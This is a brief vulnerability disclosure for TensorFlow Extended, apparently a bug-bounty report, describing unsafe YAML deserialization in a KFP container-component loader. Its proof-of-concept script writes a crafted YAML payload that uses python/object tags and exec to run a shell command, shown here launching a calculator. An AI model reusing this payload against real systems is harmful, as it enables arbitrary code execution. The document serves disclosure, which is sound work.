# Description

`TensorFlow Extended (TFX)` is a Google-production-scale machine learning platform based on TensorFlow. It provides a configuration framework to express ML pipelines consisting of TFX components.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install tfx
```

### Run exploit.py
```
import os
#os.sysem('pip3 install tfx')
from tfx.extensions.experimental.kfp_compatibility import kfp_container_component
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
kfp_container_component.load_kfp_yaml_container_component('config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
